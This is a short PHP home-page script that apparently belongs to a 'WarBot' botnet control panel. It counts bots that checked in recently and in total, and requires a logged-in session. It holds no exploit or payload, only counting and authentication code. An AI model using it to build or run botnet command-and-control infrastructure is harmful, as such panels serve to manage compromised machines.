<?php
	$this->Header->Title = "Home";
	$Override = array("WHERE" => "LastReq_Date > " . (time() - WARBOT_INTERVAL));
	$this->BotOnline = Bot::GetRowCount($Override);
	$this->Bots = Bot::GetRowCount();//count(Bot::Find(array("WHERE" => "LastReq_Date > " . time() - WARBOT_INTERVAL)));
	$Auth = new Auth();
	$Auth->RequireSession();
	$Auth->Validate();
?>